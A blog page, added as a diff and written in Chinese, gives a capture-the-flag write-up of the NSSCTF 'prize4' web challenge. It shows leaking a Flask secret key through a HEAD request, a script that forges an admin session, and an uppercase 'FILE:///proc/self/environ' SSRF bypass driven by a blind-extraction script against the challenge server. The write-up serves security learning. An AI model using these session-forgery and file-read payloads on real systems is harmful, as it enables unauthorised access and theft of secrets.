@@ -1,0 +1,414 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-Hans" color-mode=light>
+<head>
+  <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
+  <meta http-equiv="X-UA-Compatible" content="ie=edge">
+  <title>NSSCTF-prize4 - Αιώνιος</title>
+  <meta name="apple-mobile-web-app-capable" content="yes" />
+  <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+  <meta name="google" content="notranslate" />
+  
+  <meta name="description" content="前言​    尝试做NSS平台上的一道prize题
+​...">
+  <meta name="author" content="4v1d">
+  <link rel="icon" href="/images/icons/cute.jpg" type="image/png" sizes="16x16">
+  <link rel="icon" href="/images/icons/cute.jpg" type="image/png" sizes="32x32">
+  <link rel="apple-touch-icon" href="/images/icons/cute.jpg" sizes="180x180">
+  <meta rel="mask-icon" href="/images/icons/cute.jpg" color="#333333">
+  
+    <meta rel="msapplication-TileImage" content="/images/icons/cute.jpg">
+    <meta rel="msapplication-TileColor" content="#000000">
+  
+
+  
+<link rel="stylesheet" href="/css/style.css">
+
+
+  
+    
+<link rel="stylesheet" href="https://at.alicdn.com/t/font_1445822_p6ry5n7lrr.css">
+
+  
+
+  
+    
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/fancybox/3.5.7/jquery.fancybox.min.css">
+
+  
+
+  
+    
+      
+        
+        
+<link rel="stylesheet" href="https://cdn.bootcss.com/highlight.js/9.18.1/styles/xcode.min.css" name="highlight-style" mode="light">
+
+      
+        
+        
+<link rel="stylesheet" href="https://cdn.bootcss.com/highlight.js/9.18.1/styles/solarized-dark.min.css" name="highlight-style" mode="dark">
+
+      
+  
+
+  <script>
+    var CONFIG = window.CONFIG || {};
+    var ZHAOO = window.ZHAOO || {};
+    CONFIG = {
+      isHome: false,
+      fancybox: true,
+      pjax: false,
+      loading: {
+        gif: '/images/theme/loading.gif',
+        lottie: ''
+      },
+      lazyload: {
+        enable: true,
+        only_post: 'false',
+        loading: {
+          gif: '/images/theme/loading.gif',
+          lottie: ''
+        }
+      },
+      donate: {
+        enable: false,
+        alipay: 'https://pic.izhaoo.com/alipay.jpg',
+        wechat: 'https://pic.izhaoo.com/wechat.jpg'
+      },
+      galleries: {
+        enable: true
+      },
+      fab: {
+        enable: true,
+        always_show: false
+      },
+      carrier: {
+        enable: true
+      },
+      daovoice: {
+        enable: false
+      },
+      preview: {
+        background: {
+          default: '',
+          api: ''
+        },
+        motto: {
+          default: '我在开了灯的床头下，想问问自己的心啊。',
+          typing: true,
+          api: 'https://v1.hitokoto.cn/?encode=text&c=d',
+          data_contents: ''
+        },
+      },
+      qrcode: {
+        enable: true,
+        type: 'url',
+        image: 'https://pic.izhaoo.com/weapp-code.jpg',
+      },
+      toc: {
+        enable: false
+      },
+      scrollbar: {
+        type: 'default'
+      },
+      notification: {
+        enable: false,
+        delay: 4500,
+        list: '',
+        page_white_list: '',
+        page_black_list: ''
+      },
+      search: {
+        enable: false,
+        path: 'search.xml'
+      }
+    }
+  </script>
+
+  
+
+  
+
+<meta name="generator" content="Hexo 5.2.0"><link rel="alternate" href="/atom.xml" title="Αιώνιος" type="application/atom+xml">
+</head>
+
+<body class="lock-screen">
+  <div class="loading" id="loading"></div>
+  
+    
+
+
+  <nav class="navbar">
+    <div class="left">
+      
+        <i class="iconfont iconhome j-navbar-back-home"></i>
+      
+      
+        <i class="iconfont iconqrcode j-navbar-qrcode"></i>
+      
+      
+        <i class="iconfont iconmoono" id="color-toggle" color-toggle="light"></i>
+      
+      
+    </div>
+    <div class="center">NSSCTF-prize4</div>
+    <div class="right">
+      <i class="iconfont iconmenu j-navbar-menu"></i>
+    </div>
+    
+      <div id="qrcode-navbar"></div>
+    
+  </nav>
+
+  
+  
+
+<nav class="menu">
+  <div class="menu-container">
+    <div class="menu-close">
+      <i class="iconfont iconbaseline-close-px"></i>
+    </div>
+    <ul class="menu-content"><li class="menu-item">
+        <a href="/ " class="underline "> 首页</a>
+      </li><li class="menu-item">
+        <a href="/archives/ " class="underline "> 归档</a>
+      </li><li class="menu-item">
+        <a href="/tags/ " class="underline "> 标签</a>
+      </li><li class="menu-item">
+        <a href="/categories/ " class="underline "> 分类</a>
+      </li><li class="menu-item">
+        <a href="/about/ " class="underline "> 关于</a>
+      </li></ul>
+    
+      <div class="menu-copyright"><p>Powered by <a target="_blank" href="https://hexo.io">Hexo</a>  |  Theme - <a target="_blank" href="https://github.com/izhaoo/hexo-theme-zhaoo">zhaoo</a></p></div>
+    
+  </div>
+</nav>
+  <main id="main">
+  <div class="article-wrap">
+    <div class="row container">
+      <div class="col-xl-3"></div>
+      <div class="col-xl-6"><article class="article">
+  <div class="wrap">
+    <section class="head">
+  <img   class="lazyload" data-original="/images/draw/sunsky.jpg" src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg=="  draggable="false">
+  <div class="head-mask">
+    <h1 class="head-title">NSSCTF-prize4</h1>
+    <div class="head-info">
+      <span class="post-info-item"><i class="iconfont iconcalendar"></i>March 05, 2022</span>
+      
+      <span class="post-info-item"><i class="iconfont iconfont-size"></i>4927</span>
+    </div>
+  </div>
+</section>
+    <section class="main">
+      <section class="content">
+        
+        <h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>​    尝试做NSS平台上的一道prize题</p>
+<p>​    恰好标签为sql盲注，就通过这道题对盲注加深理解</p>
+<h2 id="解题"><a href="#解题" class="headerlink" title="解题"></a>解题</h2><p><img   class="lazyload" data-original="/2022/03/05/2022/3/NSSCTF-prize4/image-20220305185431322.png" src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg=="  alt="image-20220305185431322"></p>
+<p>打开后是一个输入框</p>
+<p>师傅提示说，看到url就要联想到ssrf</p>
+<p><img   class="lazyload" data-original="/2022/03/05/2022/3/NSSCTF-prize4/image-20220305185641388.png" src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg=="  alt="image-20220305185641388"></p>
+<p>但从返回的内容来看，这并不是ssrf，因为回显为非管理员的权限</p>
+<p>点击超链接</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-meta">@app.route(&#x27;/getkey&#x27;, methods=[&quot;GET&quot;])</span><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">getkey</span>():</span><br>    <span class="hljs-keyword">if</span> request.method != <span class="hljs-string">&quot;GET&quot;</span>:<br>        session[<span class="hljs-string">&quot;key&quot;</span>]=SECRET_KEY<br></code></pre></td></tr></table></figure>
+
+<p>感觉是flask框架，并且有关键字SECRET_KEY</p>
+<p>这里就是第一个知识点：secret_key伪造session来进行越权</p>
+<p>文章：<a target="_blank" rel="noopener" href="https://www.cnblogs.com/Cl0ud/p/12176979.html">secret_key伪造session来进行越权 - 春告鳥 - 博客园 (cnblogs.com)</a></p>
+<p>我们的目标就是伪造出admin的seesion来登录</p>
+<p>回到刚才超链接跳转得到的代码</p>
+<p><img   class="lazyload" data-original="/2022/03/05/2022/3/NSSCTF-prize4/image-20220305190152366.png" src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg=="  alt="image-20220305190152366"></p>
+<p>师傅是用更换请求方式的方法</p>
+<p>将GET更改为HEAD</p>
+<p><img   class="lazyload" data-original="/2022/03/05/2022/3/NSSCTF-prize4/image-20220305190637134.png" src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg=="  alt="image-20220305190637134"></p>
+<p>到jwt在线网站解密</p>
+<p><img   class="lazyload" data-original="/2022/03/05/2022/3/NSSCTF-prize4/image-20220305190708643.png" src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg=="  alt="image-20220305190708643"></p>
+<p>得到key：c5d0ffab-889c-4b55-8595-98872036da0d</p>
+<p>然后挺离谱的，我按照参考文章使用github上的脚本跑的jwt都是错的==</p>
+<p>使用哔哩哔哩视频讲解的脚本</p>
+<figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-keyword">from</span> flask <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">import</span> base64<br><br>app = Flask(__name__)<br>app.config[<span class="hljs-string">&#x27;SECRET_KEY&#x27;</span>] = <span class="hljs-string">&#x27;6247a6c6-4f64-4a5c-a7c1-adbe29ac445a&#x27;</span><br><br>@app.route(&quot;/&quot;,methods=[&quot;GET&quot;,&quot;POST&quot;])<br>def <span class="hljs-keyword">login</span>():<br>    <span class="hljs-keyword">session</span>[&quot;admin&quot;] = <span class="hljs-keyword">True</span><br>    <span class="hljs-keyword">return</span> request.full_path<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    app.run(host=<span class="hljs-string">&#x27;0.0.0.0&#x27;</span>,port=<span class="hljs-number">8000</span>)<br></code></pre></td></tr></table></figure>
+
+<p><img   class="lazyload" data-original="/2022/03/05/2022/3/NSSCTF-prize4/image-20220305204836153.png" src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg=="  alt="image-20220305204836153"></p>
+<p>伪造访问成功</p>
+<p><img   class="lazyload" data-original="/2022/03/05/2022/3/NSSCTF-prize4/image-20220305204906227.png" src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg=="  alt="image-20220305204906227"></p>
+<p>源码扒下来</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> flask <span class="hljs-keyword">import</span> Flask, request, session, render_template, url_for,redirect,render_template_string<br><span class="hljs-keyword">import</span> base64<br><span class="hljs-keyword">import</span> urllib.request<br><span class="hljs-keyword">import</span> uuid<br><span class="hljs-keyword">import</span> flag <br><br>SECRET_KEY=str(uuid.uuid4())<br><br>app = Flask(__name__)<br>app.config.update(dict(<br>    SECRET_KEY=SECRET_KEY,<br>))<br><br><span class="hljs-comment">#src in /app</span><br><br><span class="hljs-meta">@app.route(&#x27;/&#x27;)</span><br><span class="hljs-meta">@app.route(&#x27;/index&#x27;,methods=[&#x27;GET&#x27;])</span><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">index</span>():</span><br>    <span class="hljs-keyword">return</span> render_template(<span class="hljs-string">&quot;index.html&quot;</span>)<br><br><span class="hljs-meta">@app.route(&#x27;/get_data&#x27;, methods=[&quot;GET&quot;,&#x27;POST&#x27;])</span><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">get_data</span>():</span><br>    data = request.form.get(<span class="hljs-string">&#x27;data&#x27;</span>, <span class="hljs-string">&#x27;123&#x27;</span>)<br>    <span class="hljs-keyword">if</span> type(data) <span class="hljs-keyword">is</span> str:<br>        data=data.encode(<span class="hljs-string">&#x27;utf8&#x27;</span>)<br>    url = request.form.get(<span class="hljs-string">&#x27;url&#x27;</span>, <span class="hljs-string">&#x27;http://127.0.0.1:8888/&#x27;</span>)<br>    <span class="hljs-keyword">if</span> data <span class="hljs-keyword">and</span> url:<br>        session[<span class="hljs-string">&#x27;data&#x27;</span>] = data<br>        session[<span class="hljs-string">&#x27;url&#x27;</span>] = url<br>        session[<span class="hljs-string">&quot;admin&quot;</span>]=<span class="hljs-literal">False</span><br>        <span class="hljs-keyword">return</span> redirect(url_for(<span class="hljs-string">&#x27;home&#x27;</span>))<br>    <span class="hljs-keyword">return</span> redirect(url_for(<span class="hljs-string">&#x27;/&#x27;</span>))<br><br><span class="hljs-meta">@app.route(&#x27;/home&#x27;, methods=[&quot;GET&quot;])</span><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">home</span>():</span><br>    <span class="hljs-keyword">if</span> session.get(<span class="hljs-string">&quot;admin&quot;</span>,<span class="hljs-literal">False</span>):<br>        <span class="hljs-keyword">return</span> render_template_string(open(__file__).read())<br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-keyword">return</span> render_template(<span class="hljs-string">&quot;home.html&quot;</span>,data=session.get(<span class="hljs-string">&#x27;data&#x27;</span>,<span class="hljs-string">&#x27;Not find data...&#x27;</span>))<br><br><span class="hljs-meta">@app.route(&#x27;/getkey&#x27;, methods=[&quot;GET&quot;])</span><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">getkey</span>():</span><br>    <span class="hljs-keyword">if</span> request.method != <span class="hljs-string">&quot;GET&quot;</span>:<br>        session[<span class="hljs-string">&quot;key&quot;</span>]=SECRET_KEY<br>    <span class="hljs-keyword">return</span> render_template_string(<span class="hljs-string">&#x27;&#x27;&#x27;@app.route(&#x27;/getkey&#x27;, methods=[&quot;GET&quot;])</span><br><span class="hljs-string">def getkey():</span><br><span class="hljs-string">    if request.method != &quot;GET&quot;:</span><br><span class="hljs-string">        session[&quot;key&quot;]=SECRET_KEY&#x27;&#x27;&#x27;</span>)<br><br><span class="hljs-meta">@app.route(&#x27;/get_hindd_result&#x27;, methods=[&quot;GET&quot;])</span><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">get_hindd_result</span>():</span><br>    <span class="hljs-keyword">if</span> session[<span class="hljs-string">&#x27;data&#x27;</span>] <span class="hljs-keyword">and</span> session[<span class="hljs-string">&#x27;url&#x27;</span>]:<br>        <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;file:&#x27;</span> <span class="hljs-keyword">in</span> session[<span class="hljs-string">&#x27;url&#x27;</span>]:<br>            <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;no no no&quot;</span><br>        data=(session[<span class="hljs-string">&#x27;data&#x27;</span>]).decode(<span class="hljs-string">&#x27;utf8&#x27;</span>)<br>        url_text=urllib.request.urlopen(session[<span class="hljs-string">&#x27;url&#x27;</span>]).read().decode(<span class="hljs-string">&#x27;utf8&#x27;</span>)<br>        <span class="hljs-keyword">if</span> url_text <span class="hljs-keyword">in</span> data <span class="hljs-keyword">or</span> data <span class="hljs-keyword">in</span> url_text:<br>            <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;you get it&quot;</span><br>    <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;what ???&quot;</span><br><br><span class="hljs-meta">@app.route(&#x27;/getflag&#x27;, methods=[&quot;GET&quot;])</span><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">get_flag</span>():</span><br>    res = flag.waf(request)<br>    <span class="hljs-keyword">return</span> res<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    app.run(host=<span class="hljs-string">&#x27;0.0.0.0&#x27;</span>, debug=<span class="hljs-literal">False</span>, port=<span class="hljs-number">8888</span>)<br></code></pre></td></tr></table></figure>
+
+<p>视频里atao师傅说看见返回内容的不同要想到布尔盲注</p>
+<p><img   class="lazyload" data-original="/2022/03/05/2022/3/NSSCTF-prize4/image-20220305205042249.png" src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg=="  alt="image-20220305205042249"></p>
+<p><img   class="lazyload" data-original="/2022/03/05/2022/3/NSSCTF-prize4/image-20220305210228558.png" src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg=="  alt="image-20220305210228558"></p>
+<p>在get_hindd_result类中可能存在任意文件读取</p>
+<p>file被过滤了，但后面证明大写就可以绕过</p>
+<p>atao师傅的脚本</p>
+<p><img   class="lazyload" data-original="/2022/03/05/2022/3/NSSCTF-prize4/image-20220305210410183.png" src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg=="  alt="image-20220305210410183"></p>
+<p>我用到的是另一位师傅的脚本</p>
+<p>[<a target="_blank" rel="noopener" href="https://www.wolai.com/k1he/pDVkq5wFGEAJYaUgPFKiu5">NSSCTF]prize4(ssrf+盲注) (wolai.com)</a></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># -*- coding: utf-8 -*-</span><br><span class="hljs-comment"># @Author: k1he</span><br><span class="hljs-comment"># @Date:   2021-09-23 09:10:09</span><br><span class="hljs-comment"># @Last Modified by:   k1he</span><br><span class="hljs-comment"># @Last Modified time: 2021-09-27 22:31:49</span><br><span class="hljs-keyword">import</span> base64<br><span class="hljs-keyword">import</span> requests<br><br>url = <span class="hljs-string">&quot;http://1.14.71.254:28062/get_data&quot;</span><br>letters = <span class="hljs-string">&quot;0123456789abcdefghijklmnopqrstuvwxyz&#125;-&#123;&quot;</span><br>flag = <span class="hljs-string">&#x27;NSSCTF&#123;&#x27;</span><br><span class="hljs-keyword">while</span> <span class="hljs-number">1</span>:<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> letters:<br>        temp_flag = flag + i<br>        print(<span class="hljs-string">&quot;temp_flag:&quot;</span>, temp_flag)  <span class="hljs-comment"># 打印当前跑出的内容</span><br><br>        data = &#123;<span class="hljs-string">&#x27;url&#x27;</span>: <span class="hljs-string">&#x27;FILE:///proc/self/environ&#x27;</span>, <span class="hljs-string">&#x27;data&#x27;</span>: temp_flag, <span class="hljs-string">&#x27;submit&#x27;</span>: <span class="hljs-string">&#x27;%E6%8F%90%E4%BA%A4&#x27;</span>, &#125;<br>        res = requests.Session()<br>        <span class="hljs-comment">#print(res)</span><br>        res.get(url=url, data=data)  <span class="hljs-comment"># 获取session</span><br><br>        <span class="hljs-comment">#print(str(res.cookies.values())[2:-2])</span><br>        result = requests.get(url=<span class="hljs-string">&quot;http://1.14.71.254:28062/get_hindd_result&quot;</span>,<br>                              cookies=&#123;<span class="hljs-string">&quot;session&quot;</span>: str(res.cookies.values())[<span class="hljs-number">2</span>:<span class="hljs-number">-2</span>]&#125;)<br>        <span class="hljs-comment"># print(result.text)#打印响应内容</span><br><br>        <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;you get it&quot;</span> <span class="hljs-keyword">in</span> result.text:<br>            flag += i<br>            print(<span class="hljs-string">&quot;flag&quot;</span>, flag)<br>            <span class="hljs-keyword">break</span><br><span class="hljs-comment"># NSSCTF&#123;04106186-e3b2-4766-ba0b-0064e4bfd705&#125;</span><br></code></pre></td></tr></table></figure>
+
+<p>运行结果截图</p>
+<p><img   class="lazyload" data-original="/2022/03/05/2022/3/NSSCTF-prize4/image-20220305211153994.png" src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg=="  alt="image-20220305211153994"></p>
+<p>这样就可以得到flag</p>
+<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>这道题考点为：python、ssrf、布尔盲注、jwt、session伪造请求登录</p>
+<p>布尔盲注和脚本编写是其中较为简单的点</p>
+<p>关注下这位师傅的博客：<a target="_blank" rel="noopener" href="http://www.k1he.cn/">k1he</a></p>
+
+      </section>
+      <section class="extra">
+        
+          <ul class="copyright">
+  
+    <li><strong>本文作者：</strong>4v1d</li>
+    <li><strong>本文链接：</strong><a href="http://daweitech.github.io/2022/03/05/2022/3/NSSCTF-prize4/index.html" title="http:&#x2F;&#x2F;daweitech.github.io&#x2F;2022&#x2F;03&#x2F;05&#x2F;2022&#x2F;3&#x2F;NSSCTF-prize4&#x2F;index.html">http:&#x2F;&#x2F;daweitech.github.io&#x2F;2022&#x2F;03&#x2F;05&#x2F;2022&#x2F;3&#x2F;NSSCTF-prize4&#x2F;index.html</a></li>
+    <li><strong>版权声明：</strong>本博客所有文章均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh" title="BY-NC-SA" target="_blank" rel="noopener">BY-NC-SA</a> 许可协议，转载请注明出处！</li>
+  
+</ul>
+        
+        
+        
+        
+  <nav class="nav">
+    <a></a>
+    <a href="/2022/03/04/2021/sql/index/">SQL-参考文章<i class="iconfont iconright"></i></a>
+  </nav>
+
+      </section>
+      
+    </section>
+  </div>
+</article></div>
+      <div class="col-xl-3">
+        
+      </div>
+    </div>
+  </div>
+</main>
+  
+
+<footer class="footer">
+  <div class="footer-social"><a 
+        href="tencent://message/?Menu=yes&uin=905095727 "
+        target="_blank"
+        class="footer-social-item"
+        onMouseOver="this.style.color= '#12B7F5'" 
+        onMouseOut="this.style.color='#33333D'">
+          <i class="iconfont  iconQQ "></i>
+      </a><a 
+        href="javascript:; "
+        target="_blank"
+        class="footer-social-item"
+        onMouseOver="this.style.color= '#09BB07'" 
+        onMouseOut="this.style.color='#33333D'">
+          <i class="iconfont  iconwechat-fill "></i>
+      </a><a 
+        href="https://www.instagram.com/izhaoo/ "
+        target="_blank"
+        class="footer-social-item"
+        onMouseOver="this.style.color= '#DA2E76'" 
+        onMouseOut="this.style.color='#33333D'">
+          <i class="iconfont  iconinstagram "></i>
+      </a><a 
+        href="https://github.com/zhaoo "
+        target="_blank"
+        class="footer-social-item"
+        onMouseOver="this.style.color= '#9f7be1'" 
+        onMouseOut="this.style.color='#33333D'">
+          <i class="iconfont  icongithub-fill "></i>
+      </a><a 
+        href="mailto:izhaoo@163.com "
+        target="_blank"
+        class="footer-social-item"
+        onMouseOver="this.style.color=#FF3B00" 
+        onMouseOut="this.style.color='#33333D'">
+          <i class="iconfont  iconmail"></i>
+      </a></div>
+  
+    <div class="footer-copyright"><p>Powered by <a target="_blank" href="https://hexo.io">Hexo</a>  |  Theme - <a target="_blank" href="https://github.com/izhaoo/hexo-theme-zhaoo">zhaoo</a></p></div>
+  
+</footer>
+  
+      <div class="fab fab-plus">
+    <i class="iconfont iconplus"></i>
+  </div>
+  
+  
+  
+  <div class="fab fab-up">
+    <i class="iconfont iconcaret-up"></i>
+  </div>
+  
+  
+  
+    
+<script src="/js/color-mode.js"></script>
+
+  
+  
+</body>
+
+<script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
+
+
+
+
+
+  
+<script src="https://cdn.bootcdn.net/ajax/libs/jquery.lazyload/1.9.1/jquery.lazyload.min.js"></script>
+
+
+
+
+  
+<script src="https://cdnjs.cloudflare.com/ajax/libs/fancybox/3.5.7/jquery.fancybox.min.js"></script>
+
+
+
+
+
+
+  
+<script src="https://cdn.bootcdn.net/ajax/libs/jquery.qrcode/1.0/jquery.qrcode.min.js"></script>
+
+
+
+
+<script src="/js/utils.js"></script>
+<script src="/js/script.js"></script>
+
+
+
+
+
+
+
+  <script>
+    (function () {
+      var bp = document.createElement('script');
+      var curProtocol = window.location.protocol.split(':')[0];
+      if (curProtocol === 'https') {
+        bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';
+      } else {
+        bp.src = 'http://push.zhanzhang.baidu.com/push.js';
+      }
+      var s = document.getElementsByTagName("script")[0];
+      s.parentNode.insertBefore(bp, s);
+    })();
+  </script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+</html>
